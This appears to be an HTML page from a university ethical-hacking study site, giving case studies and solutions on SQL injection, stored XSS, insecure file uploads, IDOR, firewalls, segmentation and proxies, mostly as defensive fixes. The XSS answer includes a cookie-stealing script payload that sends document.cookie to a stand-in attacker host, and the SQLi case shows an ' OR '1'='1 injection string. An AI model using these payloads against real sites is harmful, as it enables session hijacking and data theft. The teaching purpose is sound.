@@ -1,0 +1,520 @@
+<!DOCTYPE html>
+<html lang="en" data-theme="dark">
+<head>
+<!-- ⚡ Arpit | Ethical Hacking MiniBook 2026 | University of Delhi -->
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="author" content="Arpit"><meta name="description" content="Ethical Hacking Classroom Activities & Complete Solutions — Faculty of Technology, University of Delhi. Covers Web Portals, Firewalls, Proxies, OWASP Top 10, and Secure Coding case studies.">
+<title>Classroom Activities & Solutions | Ethical Hacking MiniBook 🛡️</title>
+<link rel="manifest" href="manifest.json">
+<link rel="stylesheet" href="assets/css/main.css">
+<link rel="stylesheet" href="assets/css/components.css">
+<link rel="stylesheet" href="assets/css/animations.css">
+<link rel="stylesheet" href="assets/css/chapters.css">
+<link rel="stylesheet" href="assets/css/timer.css">
+</head>
+<body>
+<div id="progress-bar"></div>
+
+<!-- HEADER -->
+<header id="main-header">
+  <div class="header-left">
+    <button id="sidebar-toggle" class="icon-btn" title="Toggle Sidebar (S)" aria-label="Toggle Navigation">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="3" y1="6" x2="21" y2="6"/><line x1="3" y1="12" x2="21" y2="12"/><line x1="3" y1="18" x2="21" y2="18"/></svg>
+    </button>
+    <div class="brand-logo">
+      <div class="brand-icon">🛡️</div>
+      <div class="brand-text">
+        <span class="main">Ethical Hacking</span>
+        <span class="sub">University of Delhi · B.Tech CSE</span>
+      </div>
+    </div>
+  </div>
+
+  <span class="header-chapter-title">Classroom Activities & Solutions</span>
+
+  <div class="header-right">
+    <button id="search-btn" class="icon-btn" title="Search (Ctrl+K)" aria-label="Search">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="11" cy="11" r="8"/><path d="M21 21l-4.35-4.35"/></svg>
+    </button>
+    <button id="print-btn" title="Print to Clean PDF (Ctrl+P)" aria-label="Print">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" width="16" height="16"><polyline points="6 9 6 2 18 2 18 9"/><path d="M6 18H4a2 2 0 01-2-2v-5a2 2 0 012-2h16a2 2 0 012 2v5a2 2 0 01-2 2h-2"/><rect x="6" y="14" width="12" height="8"/></svg>
+      <span class="print-label">PDF</span>
+    </button>
+    <button id="reading-mode-btn" class="icon-btn" title="Reading Focus Mode (F)" aria-label="Reading Mode">📖</button>
+    <button id="theme-toggle" class="icon-btn" title="Toggle Theme (T)" aria-label="Theme"></button>
+  </div>
+</header>
+
+<!-- SIDEBAR -->
+<div id="sidebar-overlay"></div>
+<aside id="sidebar">
+  <nav class="sidebar-nav">
+    <div class="sidebar-section">
+      <div class="sidebar-section-label">Navigation</div>
+      <a href="index.html" class="sidebar-link"><span class="link-icon">🏠</span>Home Portal</a>
+      <a href="quick-learn.html" class="sidebar-link"><span class="link-icon">⚡</span>Quick Learn</a>
+      <a href="last-minute.html" class="sidebar-link"><span class="link-icon">⏱️</span>Last-Minute Cram</a>
+      <a href="activities.html" class="sidebar-link active"><span class="link-icon">📁</span>Activities & Solutions</a>
+      <a href="exams/mcq-test.html" class="sidebar-link"><span class="link-icon">📝</span>MCQ Test Simulator</a>
+      <a href="progress.html" class="sidebar-link"><span class="link-icon">📊</span>Study Dashboard</a>
+    </div>
+
+    <div class="sidebar-section">
+      <div class="sidebar-section-label">Core Chapters</div>
+      <a href="chapters/ch00-syllabus-guide.html" class="sidebar-link"><span class="link-icon">🧭</span>Ch 0 — Syllabus &amp; Blueprint</a>
+      <a href="chapters/ch00-syllabus-guide-hinglish.html" class="sidebar-link sidebar-mukul-sublink"><span class="link-icon">🔥</span>Ch 0 · Mukul Hinglish</a>
+      <a href="chapters/ch01-fundamentals-ethics.html" class="sidebar-link"><span class="link-icon">🛡️</span>Ch 1 — Fundamentals & Ethics</a>
+      <a href="chapters/ch01-fundamentals-ethics-hinglish.html" class="sidebar-link sidebar-mukul-sublink"><span class="link-icon">🔥</span>Ch 1 · Mukul Hinglish</a>
+      <a href="chapters/ch02-network-system-security.html" class="sidebar-link"><span class="link-icon">🌐</span>Ch 2 — Network & System Security</a>
+      <a href="chapters/ch02-network-system-security-hinglish.html" class="sidebar-link sidebar-mukul-sublink"><span class="link-icon">🔥</span>Ch 2 · Mukul Hinglish</a>
+      <a href="chapters/ch03-web-application-security.html" class="sidebar-link"><span class="link-icon">💻</span>Ch 3 — Web & App Security</a>
+      <a href="chapters/ch04-advanced-cybersecurity.html" class="sidebar-link"><span class="link-icon">🔒</span>Ch 4 — Advanced Cyber & Crypto</a>
+      <a href="chapters/ch05-practical-lab-workbook.html" class="sidebar-link"><span class="link-icon">🔬</span>Ch 5 — Practical Labs (1 to 7)</a>
+    </div>
+
+    <div class="sidebar-section">
+      <div class="sidebar-section-label">Activities on this page</div>
+      <a href="#act-30sep" class="sidebar-link"><span class="link-icon">📌</span>30 Sep: Secure Coding (SQLi/XSS)</a>
+      <a href="#act-28sep" class="sidebar-link"><span class="link-icon">📌</span>28 Sep: OWASP Top 10 (Access Control)</a>
+      <a href="#act-2" class="sidebar-link"><span class="link-icon">📌</span>Activity 2: Firewalls & TCP SYN</a>
+      <a href="#act-18sep" class="sidebar-link"><span class="link-icon">📌</span>18 Sep: Kali Linux Lab</a>
+      <a href="#act-21sep" class="sidebar-link"><span class="link-icon">📌</span>21 Sep: Campus Network Defense</a>
+      <a href="#act-23sep" class="sidebar-link"><span class="link-icon">📌</span>23 Sep: Proxy Web Control</a>
+      <a href="#act-1-3" class="sidebar-link"><span class="link-icon">📌</span>Activity 1.3: University Web Portal</a>
+    </div>
+  </nav>
+  <div class="sidebar-footer">
+    <div class="sidebar-brand-mark"><div class="mark">🛡️</div><span>Arpit · DU B.Tech CSE</span></div>
+  </div>
+</aside>
+
+<!-- MAIN CONTENT -->
+<main id="main-content">
+  <div class="chapter-content-container">
+    
+    <!-- Hero / Intro -->
+    <div style="margin-bottom: 2rem;">
+      <div style="display:inline-flex; align-items:center; gap:8px; background:var(--accent-soft); border:1px solid var(--accent-border); border-radius:99px; padding:4px 14px; font-size:0.75rem; font-weight:700; color:var(--accent-light); margin-bottom:12px;">
+        🎓 Faculty of Technology · University of Delhi · Academic Year 2026
+      </div>
+      <h1 style="font-size: clamp(2rem, 4vw, 2.8rem); font-weight: 900; letter-spacing: -0.03em; color: var(--tx-primary); margin: 0 0 10px;">
+        Course Activities & Complete Solutions
+      </h1>
+      <p style="color: var(--tx-secondary); font-size: 1.05rem; line-height: 1.6; margin: 0;">
+        All 7 official classroom activity sheets, institutional case studies, and exam task sets analyzed with verified root causes, step-by-step solutions, code fixes, and defensive architectural principles.
+      </p>
+    </div>
+
+    <!-- Quick Pill Nav -->
+    <div class="activity-nav-bar">
+      <a href="#act-30sep" class="act-pill-btn active">💻 30 Sep: Secure Coding</a>
+      <a href="#act-28sep" class="act-pill-btn">🌐 28 Sep: OWASP Top 10</a>
+      <a href="#act-2" class="act-pill-btn">🛡️ Activity 2: Firewalls</a>
+      <a href="#act-18sep" class="act-pill-btn">🐧 18 Sep: Kali Lab</a>
+      <a href="#act-21sep" class="act-pill-btn">🏫 21 Sep: Campus Net</a>
+      <a href="#act-23sep" class="act-pill-btn">🔄 23 Sep: Proxies</a>
+      <a href="#act-1-3" class="act-pill-btn">🎓 Activity 1.3: Web Portal</a>
+    </div>
+
+    <!-- ACTIVITY: 30TH SEPTEMBER — SECURE CODING PRACTICES -->
+    <section id="act-30sep" style="margin-bottom: 3.5rem;">
+      <div style="display:flex; align-items:center; justify-content:space-between; margin-bottom:1.5rem;">
+        <h2 style="font-size:1.7rem; font-weight:800; color:var(--tx-primary); margin:0;">
+          30th September 2026: Exploring Secure Coding Practices
+        </h2>
+        <span class="badge-act">Unit 3 · Secure Coding</span>
+      </div>
+
+      <!-- Case Study 1 -->
+      <article class="case-card">
+        <div class="case-header">
+          <div>
+            <span style="font-size:0.8rem; font-weight:700; color:var(--accent-light); text-transform:uppercase;">Case Study 1</span>
+            <h3 class="case-title">SQL Injection in an Online Examination Management System</h3>
+          </div>
+          <span class="badge-act">Critical Severity</span>
+        </div>
+
+        <div class="scenario-box">
+          <strong>Scenario:</strong> A university develops an online examination management system. Teachers search student records using a student ID or name. The application dynamically constructs SQL queries through string concatenation:
+          <div class="code-fix">query = "SELECT * FROM students WHERE student_id = '" + user_input + "'";</div>
+          During security testing: database quotes cause syntax errors, arbitrary records are leaked using <code>' OR '1'='1</code>, and internal database stack traces are returned to the user.
+        </div>
+
+        <div class="solution-box">
+          <div class="solution-title">✅ Comprehensive Solution & Security Analysis</div>
+          
+          <div class="task-item">
+            <div class="task-q">1. Identify the secure coding weaknesses in the application.</div>
+            <div class="task-ans">
+              • <strong>Unsafe Dynamic SQL Construction:</strong> User input is concatenated directly into SQL command text instead of using parameterized queries.<br>
+              • <strong>Information Leakage:</strong> Unhandled database exceptions reveal database schema, software versions, and query structure to clients.<br>
+              • <strong>Excessive Database Privileges:</strong> The application database account runs with administrative/DBA privileges rather than least-privilege read access.<br>
+              • <strong>Lack of Server-Side Input Validation:</strong> Input characters are not verified for expected format (alphanumeric/integer student ID).
+            </div>
+          </div>
+
+          <div class="task-item">
+            <div class="task-q">2. Explain how parameterized queries prevent SQL injection.</div>
+            <div class="task-ans">
+              Parameterized queries (prepared statements) pre-compile the SQL statement structure on the database engine first. User-supplied parameters are then bound strictly as <em>literal data values</em>, never as executable SQL syntax. Even if a user enters <code>' OR '1'='1' --</code>, the database treats the entire string literally as a student ID string, completely neutralizing query hijacking.
+            </div>
+          </div>
+
+          <div class="task-item">
+            <div class="task-q">3. Code Remediation Example (Python / Node.js style)</div>
+            <div class="code-fix">
+<span style="color:#ef4444;">// VULNERABLE:</span>
+cursor.execute("SELECT * FROM students WHERE student_id = '" + student_id + "'")
+
+<span style="color:#38BDF8;">// SECURE (Parameterized Binding):</span>
+cursor.execute("SELECT name, roll_no, marks FROM students WHERE student_id = %s", (student_id,))
+            </div>
+          </div>
+
+          <div class="task-item">
+            <div class="task-q">4. Why should database error messages never be displayed directly to end users?</div>
+            <div class="task-ans">
+              Database error messages provide <em>oracle feedback</em> to an adversary (Error-Based SQL Injection). They reveal database vendor (PostgreSQL, MySQL, Oracle), table names, column structures, and syntax quirks. Secure applications must log detailed errors internally to protected log storage while presenting a generic error message (e.g., <em>"Unable to process request"</em>) to the user.
+            </div>
+          </div>
+        </div>
+      </article>
+
+      <!-- Case Study 2 -->
+      <article class="case-card">
+        <div class="case-header">
+          <div>
+            <span style="font-size:0.8rem; font-weight:700; color:var(--accent-light); text-transform:uppercase;">Case Study 2</span>
+            <h3 class="case-title">Cross-Site Scripting (XSS) in an E-Commerce Product Review Feature</h3>
+          </div>
+          <span class="badge-act">High Severity</span>
+        </div>
+
+        <div class="scenario-box">
+          <strong>Scenario:</strong> An online shopping platform lets customers submit product reviews. The review text is stored directly in the database without sanitization. When another customer views the product page, the review is injected into the DOM via <code>element.innerHTML = reviewText;</code>. Session cookies lack the <code>HttpOnly</code> attribute.
+        </div>
+
+        <div class="solution-box">
+          <div class="solution-title">✅ Comprehensive Solution & Security Analysis</div>
+          <div class="task-item">
+            <div class="task-q">1. Identify the specific type of XSS involved.</div>
+            <div class="task-ans">
+              This is <strong>Stored XSS (Persistent XSS)</strong>. The malicious payload (e.g. <code>&lt;script&gt;fetch('https://attacker.com/steal?cookie=' + document.cookie)&lt;/script&gt;</code>) is saved persistently in the database and executed inside the browser of every visitor who loads the product reviews page.
+            </div>
+          </div>
+          <div class="task-item">
+            <div class="task-q">2. Explain the difference between Input Validation and Output Encoding.</div>
+            <div class="task-ans">
+              • <strong>Input Validation</strong> verifies whether data conforms to business rules (e.g. review length &le; 500 characters, allowed characters). It answers: <em>"Is this input acceptable?"</em><br>
+              • <strong>Output Encoding</strong> converts dangerous characters into inert representations (e.g., <code>&lt;</code> becomes <code>&amp;lt;</code>, <code>&gt;</code> becomes <code>&amp;gt;</code>) at the exact point where data is rendered. It answers: <em>"How can this data be safely displayed without executing as browser code?"</em> Output encoding is the primary defense against XSS.
+            </div>
+          </div>
+          <div class="task-item">
+            <div class="task-q">3. Code Remediation Example</div>
+            <div class="code-fix">
+<span style="color:#ef4444;">// VULNERABLE (Treats input as HTML markup):</span>
+reviewDiv.innerHTML = review.comment;
+
+<span style="color:#38BDF8;">// SECURE (Treats input strictly as text, browser auto-encodes):</span>
+reviewDiv.textContent = review.comment;
+            </div>
+          </div>
+          <div class="task-item">
+            <div class="task-q">4. Cookie Defense Attributes</div>
+            <div class="task-ans">
+              Set <code>Set-Cookie: session_id=xyz; Secure; HttpOnly; SameSite=Strict</code>. The <strong>HttpOnly</strong> flag prevents JavaScript from accessing <code>document.cookie</code>, defeating credential theft even if an XSS vulnerability exists.
+            </div>
+          </div>
+        </div>
+      </article>
+
+      <!-- Case Study 3 -->
+      <article class="case-card">
+        <div class="case-header">
+          <div>
+            <span style="font-size:0.8rem; font-weight:700; color:var(--accent-light); text-transform:uppercase;">Case Study 3</span>
+            <h3 class="case-title">Insecure Authentication & File Upload in Hospital Document Portal</h3>
+          </div>
+          <span class="badge-act">Critical Severity</span>
+        </div>
+
+        <div class="scenario-box">
+          <strong>Scenario:</strong> A hospital intranet allows uploading patient medical documents. Passwords are stored using unsalted MD5. Password reset links never expire. Uploaded files are placed directly in <code>/var/www/html/uploads/</code>, relying solely on client filename extensions (<code>.pdf</code>).
+        </div>
+
+        <div class="solution-box">
+          <div class="solution-title">✅ Comprehensive Solution & Security Analysis</div>
+          <div class="task-item">
+            <div class="task-q">1. What is the danger of storing uploaded files directly in the public web root?</div>
+            <div class="task-ans">
+              An attacker can upload a web shell (e.g., <code>exploit.php</code> or <code>shell.jsp</code> disguised with a double extension or null byte) and invoke it directly by navigating to <code>http://hospital.local/uploads/exploit.php</code>. This achieves **Remote Code Execution (RCE)**, allowing full server compromise and theft of patient records.
+            </div>
+          </div>
+          <div class="task-item">
+            <div class="task-q">2. What is the multi-layered secure file upload strategy?</div>
+            <div class="task-ans">
+              1. <strong>Storage Location:</strong> Store files outside the public web root or in a dedicated object storage service (e.g. AWS S3 / private blob).<br>
+              2. <strong>Disable Execution:</strong> Configure the web server to disable script execution in the upload directory.<br>
+              3. <strong>File Renaming:</strong> Generate random UUIDs for stored files (e.g. <code>4a1f...9b2.bin</code>) rather than preserving original user filenames.<br>
+              4. <strong>Content Inspection:</strong> Validate file magic bytes (header signatures) server-side, not just client MIME types or extensions.
+            </div>
+          </div>
+          <div class="task-item">
+            <div class="task-q">3. Password Storage Remediation</div>
+            <div class="task-ans">
+              Replace MD5/SHA1 with modern adaptive slow hashing algorithms: <strong>Argon2id</strong> (recommended) or <strong>bcrypt</strong> (cost factor &ge; 12) with a unique cryptographically random salt per user.
+            </div>
+          </div>
+        </div>
+      </article>
+    </section>
+
+    <!-- ACTIVITY: 28TH SEPTEMBER — OWASP TOP 10 FRAMEWORK -->
+    <section id="act-28sep" style="margin-bottom: 3.5rem;">
+      <div style="display:flex; align-items:center; justify-content:space-between; margin-bottom:1.5rem;">
+        <h2 style="font-size:1.7rem; font-weight:800; color:var(--tx-primary); margin:0;">
+          28th September 2026: OWASP Top 10 Framework
+        </h2>
+        <span class="badge-act">Unit 3 · OWASP Top 10</span>
+      </div>
+
+      <article class="case-card">
+        <div class="case-header">
+          <div>
+            <span style="font-size:0.8rem; font-weight:700; color:var(--accent-light); text-transform:uppercase;">Case Study 1</span>
+            <h3 class="case-title">E-Commerce Application: Broken Access Control (IDOR / BOLA)</h3>
+          </div>
+          <span class="badge-act">OWASP A01:2021 / 2025</span>
+        </div>
+
+        <div class="scenario-box">
+          <strong>Scenario:</strong> An online fashion retailer lets users view past invoices. Order URLs follow the pattern <code>https://store.local/order/1001</code>. By changing the URL parameter to <code>1002</code>, User A can view User B's full address, invoice amount, and phone number without any authentication error.
+        </div>
+
+        <div class="solution-box">
+          <div class="solution-title">✅ Comprehensive Solution & Security Analysis</div>
+          <div class="task-item">
+            <div class="task-q">1. Identify the OWASP category and specific vulnerability name.</div>
+            <div class="task-ans">
+              This is <strong>OWASP A01: Broken Access Control</strong>, specifically an <strong>Insecure Direct Object Reference (IDOR)</strong>, also classified as <strong>Broken Object Level Authorization (BOLA)</strong> in API security.
+            </div>
+          </div>
+          <div class="task-item">
+            <div class="task-q">2. What authorization check must be enforced before serving the invoice?</div>
+            <div class="task-ans">
+              The server must query the database combining the requested object identifier with the current authenticated user's session ID:
+              <div class="code-fix">
+SELECT * FROM orders WHERE order_id = ? AND user_id = current_authenticated_user_id;
+              </div>
+              If no record matches, return <code>404 Not Found</code> or <code>403 Forbidden</code>. Never trust client-supplied ID parameters without verifying ownership.
+            </div>
+          </div>
+        </div>
+      </article>
+
+      <article class="case-card">
+        <div class="case-header">
+          <div>
+            <span style="font-size:0.8rem; font-weight:700; color:var(--accent-light); text-transform:uppercase;">Case Study 2</span>
+            <h3 class="case-title">University Portal: Sensitive Data & Outdated Components</h3>
+          </div>
+          <span class="badge-act">OWASP A02 & A06</span>
+        </div>
+
+        <div class="scenario-box">
+          <strong>Scenario:</strong> A college portal uses an unpatched version of jQuery (v1.9) with known prototype pollution and XSS CVEs. Passwords are transmitted in plain HTTP over the campus Wi-Fi network.
+        </div>
+
+        <div class="solution-box">
+          <div class="solution-title">✅ Comprehensive Solution & Security Analysis</div>
+          <div class="task-item">
+            <div class="task-q">1. Identify the risks of using outdated third-party libraries.</div>
+            <div class="task-ans">
+              Known CVEs in widely used libraries have public exploit payloads. Automated vulnerability scanners like OWASP ZAP or Nuclei immediately identify known versions and execute exploits without needing custom development. Maintain an active Software Bill of Materials (SBOM) and run automated dependency audits (e.g. <code>npm audit</code>, Snyk).
+            </div>
+          </div>
+          <div class="task-item">
+            <div class="task-q">2. Why must HTTPS be mandatory even inside internal campus Wi-Fi?</div>
+            <div class="task-ans">
+              Cleartext HTTP is vulnerable to local packet sniffing and ARP cache poisoning by any student on the same wireless broadcast domain. Enforcing HTTPS with HSTS guarantees confidentiality and integrity between the browser and web server.
+            </div>
+          </div>
+        </div>
+      </article>
+    </section>
+
+    <!-- ACTIVITY: ACTIVITY 2 — FIREWALLS & TCP SYN TRAFFIC -->
+    <section id="act-2" style="margin-bottom: 3.5rem;">
+      <div style="display:flex; align-items:center; justify-content:space-between; margin-bottom:1.5rem;">
+        <h2 style="font-size:1.7rem; font-weight:800; color:var(--tx-primary); margin:0;">
+          Activity 2: Network Security, Firewalls & Traffic Control
+        </h2>
+        <span class="badge-act">Unit 2 · Network Security</span>
+      </div>
+
+      <article class="case-card">
+        <div class="case-header">
+          <div>
+            <span style="font-size:0.8rem; font-weight:700; color:var(--accent-light); text-transform:uppercase;">Core Technical Case</span>
+            <h3 class="case-title">TCP SYN Packet Evaluation & Stateful Inspection Mechanisms</h3>
+          </div>
+          <span class="badge-act">Firewall Rule Decision Engine</span>
+        </div>
+
+        <div class="scenario-box">
+          <strong>Scenario:</strong> A firewall receives a TCP SYN packet destined for an internal server at <code>192.168.10.25:443</code>. The network administrator must evaluate which packet factors dictate whether the packet is accepted, dropped, or rejected.
+        </div>
+
+        <div class="solution-box">
+          <div class="solution-title">✅ Comprehensive Solution & Security Analysis</div>
+          <div class="task-item">
+            <div class="task-q">1. Which factors determine whether a TCP SYN packet is permitted?</div>
+            <div class="task-ans">
+              • <strong>Source IP Address:</strong> Checked against ingress filtering and geo-blocking/threat lists.<br>
+              • <strong>Destination IP Address:</strong> Validates whether the target host exists in an accessible zone (e.g. DMZ).<br>
+              • <strong>Destination Port (443):</strong> Matches configured service allowance rules.<br>
+              • <strong>Security Policy Action:</strong> Default-Deny rule evaluation.<br>
+              • <strong>State Table Status:</strong> For SYN packets, stateful firewalls check that no anomalous duplicate half-open session exists.
+            </div>
+          </div>
+          <div class="task-item">
+            <div class="task-q">2. Why does allowing outbound TCP/443 create an enterprise security risk?</div>
+            <div class="task-ans">
+              Because modern malware, backdoors, and ransomware Command-and-Control (C2) agents tunnel their traffic over outbound port 443 to blend into normal HTTPS browsing. Without SSL Decryption / TLS Inspection, traditional firewalls cannot see malicious commands or exfiltrated data.
+            </div>
+          </div>
+        </div>
+      </article>
+    </section>
+
+    <!-- ACTIVITY: 18TH SEPT, 21ST SEPT, 23RD SEPT & ACTIVITY 1.3 -->
+    <section id="act-18sep" style="margin-bottom: 3.5rem;">
+      <div style="display:flex; align-items:center; justify-content:space-between; margin-bottom:1.5rem;">
+        <h2 style="font-size:1.7rem; font-weight:800; color:var(--tx-primary); margin:0;">
+          18th & 21st September: Kali Linux & Campus Network Security
+        </h2>
+        <span class="badge-act">Unit 1 & 2 · Labs & Architecture</span>
+      </div>
+
+      <article class="case-card">
+        <div class="case-header">
+          <div>
+            <span style="font-size:0.8rem; font-weight:700; color:var(--accent-light); text-transform:uppercase;">18th Sep Lab Case</span>
+            <h3 class="case-title">Kali Linux VM Containment & Safe Scanning Rules</h3>
+          </div>
+          <span class="badge-act">Lab Setup</span>
+        </div>
+
+        <div class="scenario-box">
+          <strong>Scenario:</strong> A college establishes an ethical hacking laboratory. Students use Kali Linux to practice network discovery using Nmap. The instructor mandates Host-Only virtual networking.
+        </div>
+
+        <div class="solution-box">
+          <div class="solution-title">✅ Solution & Best Practices</div>
+          <div class="task-item">
+            <div class="task-q">Why is Host-Only or Internal Network configuration mandatory?</div>
+            <div class="task-ans">
+              Host-Only adapters isolate VM network traffic strictly to the virtual hypervisor switch on the host machine. This prevents port scanning traffic, Metasploit payloads, or accidental exploit packets from traversing the physical college network, tripping campus security alarms, or reaching external third parties.
+            </div>
+          </div>
+        </div>
+      </article>
+
+      <article class="case-card" id="act-21sep">
+        <div class="case-header">
+          <div>
+            <span style="font-size:0.8rem; font-weight:700; color:var(--accent-light); text-transform:uppercase;">21st Sep Architecture Case</span>
+            <h3 class="case-title">University Network Security: Segmentation & DMZ Design</h3>
+          </div>
+          <span class="badge-act">Network Architecture</span>
+        </div>
+
+        <div class="scenario-box">
+          <strong>Scenario:</strong> A university campus network connects student Wi-Fi, computer labs, library computers, and high-security administrative servers on a flat network. Unauthorized lateral probing occurs.
+        </div>
+
+        <div class="solution-box">
+          <div class="solution-title">✅ Solution & Network Segmentation Architecture</div>
+          <div class="task-item">
+            <div class="task-q">Remediation Architecture:</div>
+            <div class="task-ans">
+              1. <strong>VLAN Segmentation:</strong> Separate into VLAN 10 (Students), VLAN 20 (Faculty), VLAN 30 (Labs), VLAN 40 (Admin), and VLAN 50 (DMZ).<br>
+              2. <strong>Internal Firewall (East-West Traffic Inspection):</strong> Enforce strict ACLs prohibiting student/lab subnets from initiating connections into the administrative VLAN.<br>
+              3. <strong>DMZ Placement:</strong> Public web portals reside in the DMZ. DMZ servers are blocked from directly initiating queries into internal databases.
+            </div>
+          </div>
+        </div>
+      </article>
+    </section>
+
+    <!-- ACTIVITY: 23RD SEPT & ACTIVITY 1.3 -->
+    <section id="act-23sep" style="margin-bottom: 3.5rem;">
+      <div style="display:flex; align-items:center; justify-content:space-between; margin-bottom:1.5rem;">
+        <h2 style="font-size:1.7rem; font-weight:800; color:var(--tx-primary); margin:0;">
+          23rd Sept & Activity 1.3: Proxies & University Portal Scoping
+        </h2>
+        <span class="badge-act">Unit 1 & 2 · Scoping & Intermediaries</span>
+      </div>
+
+      <article class="case-card">
+        <div class="case-header">
+          <div>
+            <span style="font-size:0.8rem; font-weight:700; color:var(--accent-light); text-transform:uppercase;">23rd Sep Case</span>
+            <h3 class="case-title">Proxy Servers for Web Access Control & Caching</h3>
+          </div>
+          <span class="badge-act">Proxy Design</span>
+        </div>
+
+        <div class="solution-box">
+          <div class="solution-title">✅ Solution Summary</div>
+          <div class="task-item">
+            <div class="task-q">Forward vs Reverse Proxy Summary:</div>
+            <div class="task-ans">
+              • <strong>Forward Proxy:</strong> Sits in front of internal clients to monitor outbound web browsing, block prohibited URLs, cache frequent downloads, and log destinations.<br>
+              • <strong>Reverse Proxy:</strong> Sits in front of internal web servers to provide load balancing, SSL termination, and caching, shielding internal IPs from the Internet.
+            </div>
+          </div>
+        </div>
+      </article>
+
+      <article class="case-card" id="act-1-3">
+        <div class="case-header">
+          <div>
+            <span style="font-size:0.8rem; font-weight:700; color:var(--accent-light); text-transform:uppercase;">Activity 1.3 Case</span>
+            <h3 class="case-title">Security Assessment of a University Web Portal: Rules of Engagement</h3>
+          </div>
+          <span class="badge-act">Ethical Boundaries</span>
+        </div>
+
+        <div class="solution-box">
+          <div class="solution-title">✅ Rules of Engagement & Scoping Checklist</div>
+          <div class="task-item">
+            <div class="task-q">Why must real student records never be viewed or modified?</div>
+            <div class="task-ans">
+              Viewing or modifying real records violates Indian cyber law (<strong>IT Act, 2000 Section 43/66</strong>) and data privacy rules (<strong>DPDP Rules, 2025</strong>). Testing must strictly occur on synthetic test accounts in a staging or sandboxed environment under a written Scope of Work (SOW).
+            </div>
+          </div>
+        </div>
+      </article>
+    </section>
+
+  </div>
+</main>
+
+<footer>
+  <div class="chapter-content-container" style="padding-top:1.5rem; padding-bottom:1.5rem; text-align:center; color:var(--tx-muted); font-size:0.85rem; border-top:1px solid var(--bd-subtle);">
+    <span style="color:var(--em-accent-text); font-weight:700;">Ethical Hacking MiniBook</span> · University of Delhi B.Tech CSE (DSE-3/GE-5) · Designed with Pure Pitch Black &amp; Archival Paper Themes.
+  </div>
+</footer>
+
+<script src="assets/js/state.js"></script>
+<script src="assets/js/core.js"></script>
+<script>
+document.addEventListener('DOMContentLoaded', () => {
+  ThemeManager.init();
+  SidebarManager.init();
+});
+</script>
+</body>
+</html>
